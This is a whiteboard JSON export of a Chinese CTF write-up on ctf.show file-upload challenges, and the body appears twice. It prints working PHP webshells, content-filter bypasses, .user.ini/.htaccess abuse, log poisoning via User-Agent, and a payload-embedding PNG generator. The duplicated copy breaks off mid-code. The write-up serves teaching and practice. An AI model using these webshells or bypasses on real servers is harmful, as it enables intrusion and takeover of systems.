{"type":"wb","version":2,"source":"https://www.iodraw.com","elements":[{"id":"krosnCEaWiYt8yKBNmxGw","type":"text","x":461,"y":102,"width":2518,"height":24471,"angle":0,"strokeColor":"#000000","backgroundColor":"transparent","fillStyle":"hachure","strokeWidth":1,"strokeStyle":"solid","roughness":1,"opacity":100,"groupIds":[],"strokeSharpness":"sharp","seed":2029004805,"version":3,"versionNonce":305113797,"isDeleted":false,"boundElements":null,"updated":1729956288942,"link":null,"text":"What is Upload-File？\n顾名思义就是给网上传文件，比如qq空间\n\n上传文件时服务器后端语言没有对上传的文件进行严格的验证和过滤，容易造成上传任意文件的情况，从而使得攻击者绕过上传机制上传恶意代码并执行控制服务器\n\n恶意代码文件就是php asp aspx jsp等，也被称为webshell\n\nUpload-File In CTF\nWeb151\n考点：前端校验\n解题：\n\n\n进来之后很明显一个上传点 并且给出提示\n\n直接上传php后缀文件被禁止 同时任意长传一个其他的后缀 随意输入也被禁止\n\n故为白名单检测 只能上传png后缀格式\n\n于是构造一句话木马放到图片中上传\n\nGIF89a<?php eval($_POST['a']);?>\n1\n\n\n抓包，想要把php的内容解析 需要把后缀修改\n\n在抓包的这一块已经绕过了前端验证\n\n\n\n修改 发送 上传成功\n\n\n\n得到图片的路径/upload/upload.php\n\n一定注意是php后缀 因为修改过 上传的就是php后缀的文件\n\n法1 ： 直接rce\n\n\n法2 : 中国蚁剑\n\n\n密码是我们一句话木马里面的参数a\n\n\n\n连接成功\n\n\n\nWeb152\n考点：后端校验要严密\n解题：\n\n\n\n\n这里和上一题一样 就能打通 但是思考一下题目 为什么说后端验证要严格呢\n\n这里我们重新构造了一个一句话木马图片不加前缀GIF89a\n\n\n\n好吧 效果是一样的hhh\n\n本来我以为与Content-Type有关\n\nimage/png\nimage/gif\njpg image/jpeg\n然鹅并没有 OK 解决 下一题\n\nWeb153\n考点：后端校验 配置文件介绍\n解题：\n再上传一个png 改后缀为php 好！寄\n\n\n\n可以看到msg没有正常显示位置 上传失败\n\n所以我们使用配置文件去解析一下，配置文件有两个 下面分别介绍一下\n\nReference1\n\n.user.ini\n\n在nginx或者Apache服务中都可以使用\n\n利用条件：open_basedir没有被限制\n\n利用函数：auto_append_file 、 auto_prepend_file\n\n利用原理：使用该配置文件可以让所有php文件自动包含某个文件\n\n解释两个函数：\n\nauto_append_file : 在加载打开的php文件的第一行代码之后加载配置指定的php文件\n\nauto_prepend_file : 在加载打开的php文件的第一行代码之前加载配置指定的php文件\n\n利用过程：\n\n上传一句话木马图片\n上传配置文件\n找到目标服务器任意的php进行访问 会触发我们的配置文件\n.htaccess\n\n只能在Apache使用\n\n那我们先探测一下 这个网址的服务是什么\n\n在kali里面直接whatweb\n\n┌──(kali㉿kali)-[~]\n└─$ whatweb http://340f03f0-6c52-4b26-95e2-65c0a527be46.challenge.ctf.show/\nhttp://340f03f0-6c52-4b26-95e2-65c0a527be46.challenge.ctf.show/ [200 OK] Country[CHINA][CN], HTML5, HTTPServer[nginx/1.20.1], IP[124.223.158.81], JQuery[3.2.1], PHP[7.3.11], Script, Title[CTFshow-web入门], X-Powered-By[PHP/7.3.11], nginx[1.20.1]\n1\n2\n3\n发现是nginx 所以使用第一个配置文件\n\n先上传我们一句话木马构造的png文件 不用抓包了 就直接上传即可\n\n然后 想办法上传配置文件\n\n先上传一个正常的png后缀 否则过不了前端 抓包 修改名字和内容\n\n\n\n然后在upload目录下尝试index.php 确实存在 访问则会触发配置文件\n\n\n\n\n\nWeb154\n考点：后端内容校验 大小写绕过\n解题：\n\n\n上传png文件 发现对内容有检测\n\n先大小写绕过试试\n\n\n\n成功\n\n\n\n上传配置文件\n\n\n\n拿到flag\n\nWeb155\n考点：后端内容校验 短标签绕过\n解题：\n\n\n大小写绕过失效 改为短标签\n\n<?php echo 1; ?> 正常写法\n\n<? echo 1; ?> 短标签写法，5.4 起 <?= 'hello'; === <? echo 'hello';\n\n<?= phpinfo();?>\n\n<% echo 1; %> asp 风格写法\n\n<script language=\"php\"> echo 1; </script> 长标签写法\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n\n参考\n\n\n\n直接在上面的包里修改上传即可\n\n\n\n拿到flag\n\nWeb156\n考点：后端内容校验 中括号 符号绕过\n解题：\n中括号被限制了\n\n使用大括号绕过\n\n\n\n我们要来看看源码学习一下 用蚁剑连接一下\n\n\n\n\n\n<?php\n\n/*\n# -*- coding: utf-8 -*-\n# @Author: h1xa\n# @Date:   2020-10-24 19:34:52\n# @Last Modified by:   h1xa\n# @Last Modified time: 2020-10-26 15:49:51\n# @email: h1xa@ctfer.com\n# @link: https://ctfer.com\n\n*/\nerror_reporting(0);\nif ($_FILES[\"file\"][\"error\"] > 0)\n{\n\t$ret = array(\"code\"=>2,\"msg\"=>$_FILES[\"file\"][\"error\"]);\n}\nelse\n{\n    $filename = $_FILES[\"file\"][\"name\"];\n    $filesize = ($_FILES[\"file\"][\"size\"] / 1024);\n    if($filesize>1024){\n    \t$ret = array(\"code\"=>1,\"msg\"=>\"文件超过1024KB\");\n    }else{\n    \tif($_FILES['file']['type'] == 'image/png'){\n            $arr = pathinfo($filename);\n            $ext_suffix = $arr['extension'];\n            if($ext_suffix!='php'){\n                $content = file_get_contents($_FILES[\"file\"][\"tmp_name\"]);\n                if(stripos($content, \"php\")===FALSE && stripos($content,\"[\")===FALSE){\n                    move_uploaded_file($_FILES[\"file\"][\"tmp_name\"], \"upload/\".$_FILES[\"file\"][\"name\"]);\n                    $ret = array(\"code\"=>0,\"msg\"=>\"upload/\".$_FILES[\"file\"][\"name\"]);\n                }else{\n                    $ret = array(\"code\"=>2,\"msg\"=>\"文件类型不合规\");\n                }\n                \n            }else{\n                $ret = array(\"code\"=>2,\"msg\"=>\"文件类型不合规\");\n            }\n    \t\t\n    \t}else{\n    \t\t$ret = array(\"code\"=>2,\"msg\"=>\"文件类型不合规\");\n    \t}\n    \t\n    }\n\n}\n\necho json_encode($ret);\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n\n\nWeb157、158\n考点：后端内容校验 大括号 符号绕过\n解题：\n这次大括号也被ban了 所以不使用一句话木马 而是直接rce 注意嗷！分号也被ban了 直接删除即可\n\n<? exec('cat ../f* > myflag.txt')?>\n1\n解释一下命令语句：\n\nsystem : 输出并返回最后一行的shell结果\nexec ：不输出结果 返回最后一行shell的结果 所有结果可以保存到一个返回的数组里面\npassthru ：只调用命令，把命令的运行结果原样直接输出到标准输出设备上\n在我们的payload中 使用>可以把结果自定义存储到myflag.txt文件中\n\n\n\n\n\n触发\n\n\n\n查看：注意是在upload目录下\n\n\n\n也可以直接使用system\n\n\n\n\n\n\n\nWeb159\n考点：后端内容校验 小括号 符号绕过\n解题：\n仍然在前端有限制 只能上传png后缀的文件\n\n所以首先通过png后缀的图片写马\n\n发现小括号被过滤了，绕过的方法就是 ` 反引号去代替绕过\n\n两种写马的方法：\n\n写入到文件中 用 > 进行定向\n<? `cat ../f* > myflag.txt` ?>\n1\n直接使用echo进行显示\n<? echo `tac ../f*` ?>\n1\n\n\n然后通过配置文件.user.ini去解析php\n\n\n\nWeb160\n考点：后端内容校验 强限制 日志文件包含利用\n解题：\n首先要介绍一下php中include函数：\n\n在php代码的进行过程中，遇到include函数就去跳转到包含的文件中进行读取，并显示在输出中，如果是php代码，会自动解析，如果不是，则单纯以文本的方式显示，示例如下：\n\n<?php\ninclude('1.txt')?>\n1\n2\n\n\n然后回到这个题目中我们发现，反引号和空格全部被过滤了，通过单一的上传时无法实现的，所以我们采用对日志的利用。\n\n那么日志记录的是什么呢，查看了一下本地的access.log文件\n\n\n\n发现记录的有User-Agent字段里面的内容\n\n所以我们把一句话木马放到User-Agent字段中进行写入到日志中，然后通过include的函数，触发解析日志中的一句话木马\n\n\n\n\n\n<?include\"/var/l\".\"og/nginx/access.lo\".\"g\"?>\n1\n到此成功上传png文件，但是请注意两点，一个是对log有过滤，对于字符串的过滤我们将他隔开即可\n\n第二个是需要作为php语句进行解析，所以还是需要使用.user.ini\n\n\n\n然后进行触发\n\n\n\n进行连接，注意两点，一是url要加头，二是连到index.php\n\n\n\n源码一贴，学习一下验证思想：\n\n<?php\n\n/*\n# -*- coding: utf-8 -*-\n# @Author: h1xa\n# @Date:   2020-10-24 19:34:52\n# @Last Modified by:   h1xa\n# @Last Modified time: 2020-10-26 15:49:51\n# @email: h1xa@ctfer.com\n# @link: https://ctfer.com\n\n*/\nerror_reporting(0);\nif ($_FILES[\"file\"][\"error\"] > 0)\n{\n\t$ret = array(\"code\"=>2,\"msg\"=>$_FILES[\"file\"][\"error\"]);\n}\nelse\n{\n    $filename = $_FILES[\"file\"][\"name\"];\n    $filesize = ($_FILES[\"file\"][\"size\"] / 1024);\n    if($filesize>1024){\n    \t$ret = array(\"code\"=>1,\"msg\"=>\"文件超过1024KB\");\n    }else{\n    \tif($_FILES['file']['type'] == 'image/png'){\n            $arr = pathinfo($filename);\n            $ext_suffix = $arr['extension'];\n            if($ext_suffix!='php'){\n                $content = file_get_contents($_FILES[\"file\"][\"tmp_name\"]);\n                if(stripos($content, \"php\")===FALSE && check($content)){\n                    move_uploaded_file($_FILES[\"file\"][\"tmp_name\"], \"upload/\".$_FILES[\"file\"][\"name\"]);\n                    $ret = array(\"code\"=>0,\"msg\"=>\"upload/\".$_FILES[\"file\"][\"name\"]);\n                }else{\n                    $ret = array(\"code\"=>2,\"msg\"=>\"文件类型不合规\");\n                }\n                \n            }else{\n                $ret = array(\"code\"=>2,\"msg\"=>\"文件类型不合规\");\n            }\n    \t\t\n    \t}else{\n    \t\t$ret = array(\"code\"=>2,\"msg\"=>\"文件类型不合规\");\n    \t}\n    \t\n    }\n\n}\nfunction check($str){\n    return !preg_match('/php|\\{|\\[|\\;|log|\\(| |\\`/i', $str);\n}\necho json_encode($ret);\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\nWeb161\n考点：文件头检测\n解题：\n上题的payload上传失败\n\n给png添加幻术，加文件头GIF89a?\n\n\n\n\n\n贴一下源码，与上题对比去看看文件头的检测机制：\n\n<?php\n\n/*\n# -*- coding: utf-8 -*-\n# @Author: h1xa\n# @Date:   2020-10-24 19:34:52\n# @Last Modified by:   h1xa\n# @Last Modified time: 2020-10-26 15:49:51\n# @email: h1xa@ctfer.com\n# @link: https://ctfer.com\n\n*/\nerror_reporting(0);\nif ($_FILES[\"file\"][\"error\"] > 0)\n{\n\t$ret = array(\"code\"=>2,\"msg\"=>$_FILES[\"file\"][\"error\"]);\n}\nelse\n{\n    $filename = $_FILES[\"file\"][\"name\"];\n    $filesize = ($_FILES[\"file\"][\"size\"] / 1024);\n    if($filesize>1024){\n    \t$ret = array(\"code\"=>1,\"msg\"=>\"文件超过1024KB\");\n    }else{\n    \tif($_FILES['file']['type'] == 'image/png'){\n            $arr = pathinfo($filename);\n            $ext_suffix = $arr['extension'];\n            if($ext_suffix!='php'){\n                $content = file_get_contents($_FILES[\"file\"][\"tmp_name\"]);\n                if(stripos($content, \"php\")===FALSE && check($content) && getimagesize($_FILES[\"file\"][\"tmp_name\"])){\n                    move_uploaded_file($_FILES[\"file\"][\"tmp_name\"], \"upload/\".$_FILES[\"file\"][\"name\"]);\n                    $ret = array(\"code\"=>0,\"msg\"=>\"upload/\".$_FILES[\"file\"][\"name\"]);\n                }else{\n                    $ret = array(\"code\"=>2,\"msg\"=>\"文件类型不合规\");\n                }\n                \n            }else{\n                $ret = array(\"code\"=>2,\"msg\"=>\"文件类型不合规\");\n            }\n    \t\t\n    \t}else{\n    \t\t$ret = array(\"code\"=>2,\"msg\"=>\"文件类型不合规\");\n    \t}\n    \t\n    }\n\n}\nfunction check($str){\n    return !preg_match('/php|\\{|\\[|\\;|log|\\(| |\\`/i', $str);\n}\necho json_encode($ret);\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n找到检测中的区别：\n\ngetimagesize($_FILES[\"file\"][\"tmp_name\"]\n1\nIt is using the getimagesize function to retrieve information about an uploaded image file.\n\n$imageInfo = getimagesize($_FILES[\"file\"][\"tmp_name\"]);\n\nif ($imageInfo !== false) {\n    $width = $imageInfo[0];\n    $height = $imageInfo[1];\n    $mime = $imageInfo[\"mime\"];\n\n    echo \"Image width: \" . $width . \" pixels<br>\";\n    echo \"Image height: \" . $height . \" pixels<br>\";\n    echo \"Image MIME type: \" . $mime;\n} else {\n    echo \"Invalid image file\";\n}\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\nThis code retrieves the width, height, and MIME type of the uploaded image and displays them as output.\n\n因为检测MIME，所以需要添加文件头\n\nWeb162\nWeb164\n考点：PNG图片二次渲染\n这个题目奇奇怪怪的很多坑哟\n\n经过测试 只允许上传png\n\n直接上传一个我们普通的假的png木马图片 不会成功\n\n\n\n上传普通的木马图片 比如在尾部的木马 会被经过二次渲染而清除\n\n上传用脚本生成木马图片\n\n\n\n成功上传\n\n这个图片的生成方式如下：\n\n<?php\n  $p = array(0xa3, 0x9f, 0x67, 0xf7, 0x0e, 0x93, 0x1b, 0x23,\n             0xbe, 0x2c, 0x8a, 0xd0, 0x80, 0xf9, 0xe1, 0xae,\n             0x22, 0xf6, 0xd9, 0x43, 0x5d, 0xfb, 0xae, 0xcc,\n             0x5a, 0x01, 0xdc, 0x5a, 0x01, 0xdc, 0xa3, 0x9f,\n             0x67, 0xa5, 0xbe, 0x5f, 0x76, 0x74, 0x5a, 0x4c,\n             0xa1, 0x3f, 0x7a, 0xbf, 0x30, 0x6b, 0x88, 0x2d,\n             0x60, 0x65, 0x7d, 0x52, 0x9d, 0xad, 0x88, 0xa1,\n             0x66, 0x44, 0x50, 0x33);\n\n\n\n$img = imagecreatetruecolor(32, 32);\n\nfor ($y = 0; $y < sizeof($p); $y += 3) {\n  $r = $p[$y];\n  $g = $p[$y+1];\n  $b = $p[$y+2];\n  $color = imagecolorallocate($img, $r, $g, $b);\n  imagesetpixel($img, round($y / 3), 0, $color);\n}\n\nimagepng($img,'./1.png');\n?>\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n对应的木马内容：<?$_GET[0]($_POST[1]);?>\n\n上传后直接点击查看图片\n\n\n\n然后进行传参\n\n\n\n会显示看不了，你以为失败了吗 其实并没有，这个时候CtrlS 保存图片 然后改成txt文本查看 就会发现 flag已经在图片里面了\n\n\n\n之所以在图片里面 感觉是因为二次渲染的功效吧\n\nWeb165\n考点：JPG图片二次渲染\n开题之后 png也上传不了\n\n测试后发现只能上传jpg文件\n\n目前遇到两个坑\n\n上传后查看图片无法抓包\n大爹脚本无法对下载后的图片进行渲染绕过 始终报错somethingwrong\n第一个坑之所以需要是因为查看jpg图片的返回包，我们可以很清晰的发现存在二次渲染的痕迹，即ATOR: gd-jpeg v1.0 (using IJG JPEG v80), default quality\n\n解决方案：\n\n思考下我们抓包的内容是什么，是图片的信息，所以我们也可以直接下载图片然后txt打开就可以看到二次渲染的痕迹啦\n\n关于第二个 目前也没有解决 感觉需要审一下代码\n\n但是和A师傅要了一个武器库\n\n上传后直接连 不用考虑二次渲染问题，都处理好了\n\n\n\nweb166\n考点：zip文件包含\n开题CtrlU看一下\n\n\n\n发现只能上传zip文件\n\n想在压缩包后面写个一句话，直接在右侧栏中写就好\n\n\n\n\n\n成功上传后，找到这个下载文件的链接展开利用\n\n\n\n直接连蚁剑，拿下：\n\n\n\nWeb167\n考点：.htaccess解析\n\n\n只收jpg\n\n\n\n下载后可以发现木马仍然存在，所以是单纯的没有解析\n\n\n\n考虑尝试下htaccess进行解析\n\n\n\n上传成功\n\n在访问一下图片就能触发解析了\n\n\n\n直接连蚁剑，拿下\n\n\n\n现在一回顾可以发现其实题面也给出了提示\n\n\n\nhttpd\n\nweb168\n考点：基础免杀\n\n\n接收png，先上武器库图片\n\n发现带木马的图片直接传不了\n\n正常的可以传，如下\n\n\n\n我们通过这个正常上传的文件抓到上传包\n\n\n\n发现改php后缀可以上传成功\n\n\n\n猜测一下位置，发现也可以解析成功\n\n\n\n上传发现有内容检测，ban了一些东西，既然命令无法执行ls，那么使用var_dump遍历查询目录\n\n\n\n其中…表示上级目录\n\n\n\n想一下怎么读\n\n\n\n先试一下include\n\n被ban\n\n再试show_source\n\n\n\n成功 但是flag在flagaa.php\n\n总结一下：\n\n基础免杀的含义无非就是需要绕过几个函数罢了\n\n\n\n这是什么呢，存一下\n\nWeb169、170\n考点：高级免杀 包含日志\n\n\n开题发现只能传zip\n\n那么通过上传正常的zip文件进行抓包，然后进行利用\n\n注意如果zip文件有马，无法上传\n\n\n\n\n\n不知道为什么还是不行，但是抓到包了就足够了\n\nContent-Type: application/x-zip-compressed\n\n当这个类型是zip的时候始终无法上传\n\n修改为png\n\n\n\n直接成功\n\n\n\n而且可以发现对后缀也没有任何检测\n\n\n\ne 被ban了\n\n所以要做高级免杀，想到日志包含\n\n思路：\n\n把木马写在User-Agent中\n\n然后通过user.ini的设置 把指定的php文件自动加载也就是access.log\n\n设置user.ini\n\n\n\n写木马到access.log\n\n\n\n上传一个php文件触发\n\n\n\n访问一下1.php触发\n\n\n\n加载成功\n\n直接蚁剑链接 密码是1\n\n\n————————————————\n\n                            版权声明：本文为博主原创文章，遵循 CC 4.0 BY-SA 版权协议，转载请附上原文出处链接和本声明。\n                        \n原文链接：https://blog.csdn.net/jayq1/article/details/139420350","fontSize":20,"fontFamily":1,"textAlign":"left","verticalAlign":"top","baseline":24464,"containerId":null,"originalText":"What is Upload-File？\n顾名思义就是给网上传文件，比如qq空间\n\n上传文件时服务器后端语言没有对上传的文件进行严格的验证和过滤，容易造成上传任意文件的情况，从而使得攻击者绕过上传机制上传恶意代码并执行控制服务器\n\n恶意代码文件就是php asp aspx jsp等，也被称为webshell\n\nUpload-File In CTF\nWeb151\n考点：前端校验\n解题：\n\n\n进来之后很明显一个上传点 并且给出提示\n\n直接上传php后缀文件被禁止 同时任意长传一个其他的后缀 随意输入也被禁止\n\n故为白名单检测 只能上传png后缀格式\n\n于是构造一句话木马放到图片中上传\n\nGIF89a<?php eval($_POST['a']);?>\n1\n\n\n抓包，想要把php的内容解析 需要把后缀修改\n\n在抓包的这一块已经绕过了前端验证\n\n\n\n修改 发送 上传成功\n\n\n\n得到图片的路径/upload/upload.php\n\n一定注意是php后缀 因为修改过 上传的就是php后缀的文件\n\n法1 ： 直接rce\n\n\n法2 : 中国蚁剑\n\n\n密码是我们一句话木马里面的参数a\n\n\n\n连接成功\n\n\n\nWeb152\n考点：后端校验要严密\n解题：\n\n\n\n\n这里和上一题一样 就能打通 但是思考一下题目 为什么说后端验证要严格呢\n\n这里我们重新构造了一个一句话木马图片不加前缀GIF89a\n\n\n\n好吧 效果是一样的hhh\n\n本来我以为与Content-Type有关\n\nimage/png\nimage/gif\njpg image/jpeg\n然鹅并没有 OK 解决 下一题\n\nWeb153\n考点：后端校验 配置文件介绍\n解题：\n再上传一个png 改后缀为php 好！寄\n\n\n\n可以看到msg没有正常显示位置 上传失败\n\n所以我们使用配置文件去解析一下，配置文件有两个 下面分别介绍一下\n\nReference1\n\n.user.ini\n\n在nginx或者Apache服务中都可以使用\n\n利用条件：open_basedir没有被限制\n\n利用函数：auto_append_file 、 auto_prepend_file\n\n利用原理：使用该配置文件可以让所有php文件自动包含某个文件\n\n解释两个函数：\n\nauto_append_file : 在加载打开的php文件的第一行代码之后加载配置指定的php文件\n\nauto_prepend_file : 在加载打开的php文件的第一行代码之前加载配置指定的php文件\n\n利用过程：\n\n上传一句话木马图片\n上传配置文件\n找到目标服务器任意的php进行访问 会触发我们的配置文件\n.htaccess\n\n只能在Apache使用\n\n那我们先探测一下 这个网址的服务是什么\n\n在kali里面直接whatweb\n\n┌──(kali㉿kali)-[~]\n└─$ whatweb http://340f03f0-6c52-4b26-95e2-65c0a527be46.challenge.ctf.show/\nhttp://340f03f0-6c52-4b26-95e2-65c0a527be46.challenge.ctf.show/ [200 OK] Country[CHINA][CN], HTML5, HTTPServer[nginx/1.20.1], IP[124.223.158.81], JQuery[3.2.1], PHP[7.3.11], Script, Title[CTFshow-web入门], X-Powered-By[PHP/7.3.11], nginx[1.20.1]\n1\n2\n3\n发现是nginx 所以使用第一个配置文件\n\n先上传我们一句话木马构造的png文件 不用抓包了 就直接上传即可\n\n然后 想办法上传配置文件\n\n先上传一个正常的png后缀 否则过不了前端 抓包 修改名字和内容\n\n\n\n然后在upload目录下尝试index.php 确实存在 访问则会触发配置文件\n\n\n\n\n\nWeb154\n考点：后端内容校验 大小写绕过\n解题：\n\n\n上传png文件 发现对内容有检测\n\n先大小写绕过试试\n\n\n\n成功\n\n\n\n上传配置文件\n\n\n\n拿到flag\n\nWeb155\n考点：后端内容校验 短标签绕过\n解题：\n\n\n大小写绕过失效 改为短标签\n\n<?php echo 1; ?> 正常写法\n\n<? echo 1; ?> 短标签写法，5.4 起 <?= 'hello'; === <? echo 'hello';\n\n<?= phpinfo();?>\n\n<% echo 1; %> asp 风格写法\n\n<script language=\"php\"> echo 1; </script> 长标签写法\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n\n参考\n\n\n\n直接在上面的包里修改上传即可\n\n\n\n拿到flag\n\nWeb156\n考点：后端内容校验 中括号 符号绕过\n解题：\n中括号被限制了\n\n使用大括号绕过\n\n\n\n我们要来看看源码学习一下 用蚁剑连接一下\n\n\n\n\n\n<?php\n\n/*\n# -*- coding: utf-8 -*-\n# @Author: h1xa\n# @Date:   2020-10-24 19:34:52\n# @Last Modified by:   h1xa\n# @Last Modified time: 2020-10-26 15:49:51\n# @email: h1xa@ctfer.com\n# @link: https://ctfer.com\n\n*/\nerror_reporting(0);\nif ($_FILES[\"file\"][\"error\"] > 0)\n{\n\t$ret = array(\"code\"=>2,\"msg\"=>$_FILES[\"file\"][\"error\"]);\n}\nelse\n{\n    $filename = $_FILES[\"file\"][\"name\"];\n    $filesize = ($_FILES[\"file\"][\"size\"] / 1024);\n    if($filesize>1024){\n    \t$ret = array(\"code\"=>1,\"msg\"=>\"文件超过1024KB\");\n    }else{\n    \tif($_FILES['file']['type'] == 'image/png'){\n            $arr = pathinfo($filename);\n            $ext_suffix = $arr['extension'];\n            if($ext_suffix!='php'){\n                $content = file_get_contents($_FILES[\"file\"][\"tmp_name\"]);\n                if(stripos($content, \"php\")===FALSE && stripos($content,\"[\")===FALSE){\n                    move_uploaded_file($_FILES[\"file\"][\"tmp_name\"], \"upload/\".$_FILES[\"file\"][\"name\"]);\n                    $ret = array(\"code\"=>0,\"msg\"=>\"upload/\".$_FILES[\"file\"][\"name\"]);\n                }else{\n                    $ret = array(\"code\"=>2,\"msg\"=>\"文件类型不合规\");\n                }\n                \n            }else{\n                $ret = array(\"code\"=>2,\"msg\"=>\"文件类型不合规\");\n            }\n    \t\t\n    \t}else{\n    \t\t$ret = array(\"code\"=>2,\"msg\"=>\"文件类型不合规\");\n    \t}\n    \t\n    }\n\n}\n\necho json_encode($ret);\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n\n\nWeb157、158\n考点：后端内容校验 大括号 符号绕过\n解题：\n这次大括号也被ban了 所以不使用一句话木马 而是直接rce 注意嗷！分号也被ban了 直接删除即可\n\n<? exec('cat ../f* > myflag.txt')?>\n1\n解释一下命令语句：\n\nsystem : 输出并返回最后一行的shell结果\nexec ：不输出结果 返回最后一行shell的结果 所有结果可以保存到一个返回的数组里面\npassthru ：只调用命令，把命令的运行结果原样直接输出到标准输出设备上\n在我们的payload中 使用>可以把结果自定义存储到myflag.txt文件中\n\n\n\n\n\n触发\n\n\n\n查看：注意是在upload目录下\n\n\n\n也可以直接使用system\n\n\n\n\n\n\n\nWeb159\n考点：后端内容校验 小括号 符号绕过\n解题：\n仍然在前端有限制 只能上传png后缀的文件\n\n所以首先通过png后缀的图片写马\n\n发现小括号被过滤了，绕过的方法就是 ` 反引号去代替绕过\n\n两种写马的方法：\n\n写入到文件中 用 > 进行定向\n<? `cat ../f* > myflag.txt` ?>\n1\n直接使用echo进行显示\n<? echo `tac ../f*` ?>\n1\n\n\n然后通过配置文件.user.ini去解析php\n\n\n\nWeb160\n考点：后端内容校验 强限制 日志文件包含利用\n解题：\n首先要介绍一下php中include函数：\n\n在php代码的进行过程中，遇到include函数就去跳转到包含的文件中进行读取，并显示在输出中，如果是php代码，会自动解析，如果不是，则单纯以文本的方式显示，示例如下：\n\n<?php\ninclude('1.txt')?>\n1\n2\n\n\n然后回到这个题目中我们发现，反引号和空格全部被过滤了，通过单一的上传时无法实现的，所以我们采用对日志的利用。\n\n那么日志记录的是什么呢，查看了一下本地的access.log文件\n\n\n\n发现记录的有User-Agent字段里面的内容\n\n所以我们把一句话木马放到User-Agent字段中进行写入到日志中，然后通过include的函数，触发解析日志中的一句话木马\n\n\n\n\n\n<?include\"/var/l\".\"og/nginx/access.lo\".\"g\"?>\n1\n到此成功上传png文件，但是请注意两点，一个是对log有过滤，对于字符串的过滤我们将他隔开即可\n\n第二个是需要作为php语句进行解析，所以还是需要使用.user.ini\n\n\n\n然后进行触发\n\n\n\n进行连接，注意两点，一是url要加头，二是连到index.php\n\n\n\n源码一贴，学习一下验证思想：\n\n<?php\n\n/*\n# -*- coding: utf-8 -*-\n# @Author: h1xa\n# @Date:   2020-10-24 19:34:52\n# @Last Modified by:   h1xa\n# @Last Modified time: 2020-10-26 15:49:51\n# @email: h1xa@ctfer.com\n# @link: https://ctfer.com\n\n*/\nerror_reporting(0);\nif ($_FILES[\"file\"][\"error\"] > 0)\n{\n\t$ret = array(\"code\"=>2,\"msg\"=>$_FILES[\"file\"][\"error\"]);\n}\nelse\n{\n    $filename = $_FILES[\"file\"][\"name\"];\n    $filesize = ($_FILES[\"file\"][\"size\"] / 1024);\n    if($filesize>1024){\n    \t$ret = array(\"code\"=>1,\"msg\"=>\"文件超过1024KB\");\n    }else{\n    \tif($_FILES['file']['type'] == 'image/png'){\n            $arr = pathinfo($filename);\n            $ext_suffix = $arr['extension'];\n            if($ext_suffix!='php'){\n                $content = file_get_contents($_FILES[\"file\"][\"tmp_name\"]);\n                if(stripos($content, \"php\")===FALSE && check($content)){\n                    move_uploaded_file($_FILES[\"file\"][\"tmp_name\"], \"upload/\".$_FILES[\"file\"][\"name\"]);\n                    $ret = array(\"code\"=>0,\"msg\"=>\"upload/\".$_FILES[\"file\"][\"name\"]);\n                }else{\n                    $ret = array(\"code\"=>2,\"msg\"=>\"文件类型不合规\");\n                }\n                \n            }else{\n                $ret = array(\"code\"=>2,\"msg\"=>\"文件类型不合规\");\n            }\n    \t\t\n    \t}else{\n    \t\t$ret = array(\"code\"=>2,\"msg\"=>\"文件类型不合规\");\n    \t}\n    \t\n    }\n\n}\nfunction check($str){\n    return !preg_match('/php|\\{|\\[|\\;|log|\\(| |\\`/i', $str);\n}\necho json_encode($ret);\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\nWeb161\n考点：文件头检测\n解题：\n上题的payload上传失败\n\n给png添加幻术，加文件头GIF89a?\n\n\n\n\n\n贴一下源码，与上题对比去看看文件头的检测机制：\n\n<?php\n\n/*\n# -*- coding: utf-8 -*-\n# @Author: h1xa\n# @Date:   2020-10-24 19:34:52\n# @Last Modified by:   h1xa\n# @Last Modified time: 2020-10-26 15:49:51\n# @email: h1xa@ctfer.com\n# @link: https://ctfer.com\n\n*/\nerror_reporting(0);\nif ($_FILES[\"file\"][\"error\"] > 0)\n{\n\t$ret = array(\"code\"=>2,\"msg\"=>$_FILES[\"file\"][\"error\"]);\n}\nelse\n{\n    $filename = $_FILES[\"file\"][\"name\"];\n    $filesize = ($_FILES[\"file\"][\"size\"] / 1024);\n    if($filesize>1024){\n    \t$ret = array(\"code\"=>1,\"msg\"=>\"文件超过1024KB\");\n    }else{\n    \tif($_FILES['file']['type'] == 'image/png'){\n            $arr = pathinfo($filename);\n            $ext_suffix = $arr['extension'];\n            if($ext_suffix!='php'){\n                $content = file_get_contents($_FILES[\"file\"][\"tmp_name\"]);\n                if(stripos($content, \"php\")===FALSE && check($content) && getimagesize($_FILES[\"file\"][\"tmp_name\"])){\n                    move_uploaded_file($_FILES[\"file\"][\"tmp_name\"], \"upload/\".$_FILES[\"file\"][\"name\"]);\n                    $ret = array(\"code\"=>0,\"msg\"=>\"upload/\".$_FILES[\"file\"][\"name\"]);\n                }else{\n                    $ret = array(\"code\"=>2,\"msg\"=>\"文件类型不合规\");\n                }\n                \n            }else{\n                $ret = 